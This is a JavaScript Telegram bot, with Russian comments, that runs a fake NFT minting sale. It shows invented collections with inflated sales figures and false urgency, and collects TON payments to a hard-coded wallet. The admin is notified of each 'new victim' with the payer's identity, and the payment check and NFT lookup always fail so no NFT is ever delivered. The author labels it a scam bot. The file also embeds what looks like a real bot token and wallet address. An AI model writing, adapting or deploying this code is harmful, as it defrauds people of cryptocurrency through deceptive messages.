// index.js или bot.js — кидай в репозиторий
const { Telegraf, session } = require('telegraf');
const { Markup } = require('telegraf');

const BOT_TOKEN = '8575010890:AAEvKySvJ0yJGwKgVLMLhojUktrE7Sga-cg'; // твой старый рабочий токен
const WALLET_TON = 'UQAdqmGgJmCs5vll9d4jNGK5aBFd9LaS3l-gRNuua8jMdbAS';
const ADMIN_ID = 8586263322;

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const collections = [
  {name: "CyberFox Genesis",   supply: 3333,  price1: 3.7,  price5: 17,  emoji: "🦊", sold: 3124},
  {name: "Gnome Land",         supply: 5555,  price1: 4.2,  price5: 19,  emoji: "🧙", sold: 5211},
  {name: "Rich Cats",          supply: 8888,  price1: 5.5,  price5: 25,  emoji: "🐱", sold: 8666},
  {name: "TON Punks",          supply: 10000, price1: 7.4,  price5: 34,  emoji: "👨‍🎤", sold: 9877},
  {name: "Blum Dogs",          supply: 4444,  price1: 2.9,  price5: 13,  emoji: "🐶", sold: 4333},
  {name: "Hamster Kombat NFT", supply: 7777,  price1: 5.1,  price5: 23,  emoji: "🐹", sold: 7555},
  {name: "Lost Dogs",          supply: 6666,  price1: 8.8,  price5: 40,  emoji: "🥺", sold: 6444},
  {name: "Catizen Cats",       supply: 3333,  price1: 9.9,  price5: 45,  emoji: "😼", sold: 3298},
  {name: "Rocky Rabbit",       supply: 5000,  price1: 4.0,  price5: 18,  emoji: "🐰", sold: 4888},
  {name: "X Empire",           supply: 10000, price1: 6.6,  price5: 30,  emoji: "⚔️", sold: 9912},
];

function progressBar(percent) {
  const filled = '🟩';
  const empty = '⬜';
  const bar = filled.repeat(Math.round(percent/10)) + empty.repeat(10 - Math.round(percent/10));
  return bar;
}

bot.start((ctx) => {
  const col = collections[Math.floor(Math.random() * collections.length)];
  ctx.session ??= {};
  ctx.session.col = col;

  const percent = Math.round((col.sold / col.supply) * 100);
  const left = col.supply - col.sold;

  ctx.replyWithHTML(
    `<b>${col.emoji} MINT LIVE — ${col.name}</b>\n\n` +
    `<b>Прогресс:</b> ${progressBar(percent)} ${percent}%\n` +
    `<b>Осталось:</b> <code>${left}</code> из ${col.supply}\n\n` +
    `<b>Цена публичного минта:</b>\n` +
    `• 1 NFT — <b>${col.price1} TON</b>\n` +
    `• 5 NFT — <b>${col.price5} TON</b> <code>-15%</code>\n\n` +
    `<b>⚠ Осталось меньше ${left < 300 ? '300' : '500'} мест — успей!</b>\n\n` +
    `<i>Мгновенный минт • NFT сразу в Tonkeeper/Tonhub</i>`,
    menu(col)
  );
});

function menu(col) {
  return Markup.inlineKeyboard([
    [Markup.button.callback(`${col.emoji} Mint 1 × ${col.price1} TON`, 'mint1')],
    [Markup.button.callback(`${col.emoji} Mint 5 × ${col.price5} TON 🔥`, 'mint5')],
    [Markup.button.callback('🔍 My NFTs', 'mynft')]
  ]);
}

bot.action(/mint(\d+)/, async (ctx) => {
  const col = ctx.session?.col || collections[0];
  const count = ctx.match[1] === '5' ? 5 : 1;
  const amount = count === 5 ? col.price5 : col.price1;
  const comment = col.emoji + "MINT" + Math.random().toString(36).slice(2, 10).toUpperCase();

  const tonLink = `ton://transfer/${WALLET_TON}?amount=${Math.floor(amount * 1e9)}&text=${encodeURIComponent(comment)}`;

  await ctx.editMessageText(
    `${col.emoji} <b>Заказ подтверждён: ${count} × ${col.name}</b>\n\n` +
    `💰 Сумма: <b>${amount} TON</b>\n` +
    `📝 Комментарий: <code>${comment}</code>\n\n` +
    `👝 Кошелёк:\n<code>${WALLET_TON}</code>\n\n` +
    `<i>Оплати в течение 10 минут — NFT придут автоматически за 30–60 сек</i>`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '💎 Оплатить TON', url: tonLink }],
          [{ text: '💳 USDT / Карта', url: 'https://t.me/CryptoBot?start=pay' }],
          [{ text: '🔄 Проверить оплату', callback_data: `check_${Date.now()}` }]
        ]
      }
    }
  );

  // Уведомление тебе с кликабельным юзернеймом
  const userLink = ctx.from.username ? `@${ctx.from.username}` : `<a href="tg://user?id=${ctx.from.id}">${ctx.from.first_name}</a>`;
  bot.telegram.sendMessage(ADMIN_ID,
    `<b>НОВАЯ ЖЕРТВА</b>\n\n` +
    `<b>Коллекция:</b> ${col.emoji} ${col.name}\n` +
    `<b>Заказ:</b> ${count} NFT\n` +
    `<b>Сумма:</b> ${amount} TON\n` +
    `<b>Комментарий:</b> <code>${comment}</code>\n` +
    `<b>Пользователь:</b> ${userLink}\n` +
    `<b>ID:</b> <code>${ctx.from.id}</code>`,
    { parse_mode: 'HTML' }
  );
});

bot.action(/check_/, async (ctx) => {
  await ctx.answerCbQuery('Проверяем транзакцию в сети TON...', { show_alert: true });
  await ctx.editMessageText(`Платёж не найден\n\nУбедись, что:\n• Сумма точная\n• Комментарий правильный\n• Отправлено с TON-кошелька\n\nПовтори проверку через 30 сек`, {
    reply_markup: { inline_keyboard: [[{ text: '🔄 Проверить снова', callback_data: ctx.callbackQuery.data }]] }
  });
});

bot.action('mynft', (ctx) => {
  const col = ctx.session?.col || collections[0];
  ctx.editMessageText(`${col.emoji} <b>Твои NFT</b>\n\nПоиск в блокчейне...\n\nНичего не найдено 😔\nТы ещё не заминтил в этой коллекции`, {
    reply_markup: menu(col).reply_markup
  });
});

bot.launch();
console.log('Скам-бот 2025 запущен — TON летит на UQAdqmGgJmCs...');